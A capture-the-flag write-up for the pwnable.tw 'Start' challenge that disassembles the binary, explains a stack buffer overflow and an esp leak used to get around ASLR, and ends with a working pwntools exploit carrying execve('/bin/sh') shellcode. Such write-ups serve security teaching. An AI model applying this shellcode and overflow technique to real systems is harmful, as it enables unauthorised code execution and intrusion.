# Pwnable.tw - Start
* Website : Pwnable.tw
* Challenge : Start
* Writeup author : Redhung aka r3dhun9
>Contact : [Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x01
Let's use **objdump** or **r2** to disassemble the binary first :
```asm
push esp ;
push 0x804809d ;
xor eax, eax ;
xor ebx, ebx ;
xor ecx, ecx ;
xor edx, edx ;
push 0x3a465443 ; 'CTF:'
push 0x20656874 ; 'the '
push 0x20747261 ; 'art '
push 0x74732073 ; 's st'
push 0x2774654c ; 'Let''
mov ecx, esp ;
mov dl, 0x14 ; 20
mov bl 1 ; stdout
mov al 4 ; sys_write
int 0x80 ; syscall
xor ebx, ebx ;
mov dl, 0x3c ; 60
mov al, 3 ; sys_read
int 0x80 ; syscall
add esp, 0x14 ;
ret ;
```
We notice that there is a buffer overflow in this program. (Sys_read reads 60 bytes while the return address may be overwritten.)

On this point, we have a clear thought of this challenge. :100: 

We can overwrite the return address to anywhere we want! :+1: 

Let's send the shellcode and overwrite the return address to our shellcode, sweet.

## 0x02
As we thought, we use **gdb** and attach to the process, however, we cannot find the address of our shellcode due to **ASLR**.

Look back to the assembly, the entry point of the stack is stroed at the begining!

```asm
push esp ;
```
That means we can **leak** the entry point and calculate the offset to our shellcode!
Wait wait wait bro, how can we leak the address?
Let's look back to the assembly:
```asm
mov ecx, esp ;
mov dl, 0x14 ;
mov bl, 1 ;
mov al, 4 ; sys_write
```
Once we return to **mov** **ecx,** **esp;** , we will call the sys_write to leak the esp. :revolving_hearts: 

After we get the esp, we just need to calculate the offset to out shellcode and get shell! :ghost: 

## 0x03
Exploit:
```python
from pwn import *

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = 'A'*20 + p32(0x8048087)

r = remote('chall.pwnable.tw',10000)

rec = r.recv()

r.send(payload)

esp = u32(r.recv(4))

print(hex(esp))

payload2 = 'B'*20 + p32(esp+0x14) + shellcode

r.send(payload2)

r.interactive()
```
